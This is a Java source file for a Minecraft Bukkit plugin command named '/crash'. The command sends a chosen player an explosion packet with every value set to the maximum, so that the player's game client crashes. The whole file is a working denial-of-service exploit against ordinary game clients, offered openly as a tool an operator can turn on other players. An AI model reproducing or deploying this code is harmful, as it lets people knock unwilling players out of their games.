package me.electrum.crash.commands;

import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;

public class CrashPlayer implements CommandExecutor {
    @SuppressWarnings("ALL")
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("crash")) {
            if (!sender.hasPermission("crash.player")) {
                sender.sendMessage("You do not have permission to use this command");
                return true;
            }
            if (args.length != 0) {
                if (Bukkit.getPlayer(args[0]) == null) {
                    sender.sendMessage(ChatColor.RED + "Invaild player provided");
                    return true;
                }
                Player target = Bukkit.getPlayer(args[0]);
                ((CraftPlayer) target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(
                        Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,
                        Float.MAX_VALUE, Collections.EMPTY_LIST,
                        new Vec3D(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE)));
                sender.sendMessage(ChatColor.GREEN + "Crashed " + target);
            } else {
                sender.sendMessage("Provide a player");
            }
        }
        return true;
    }
}
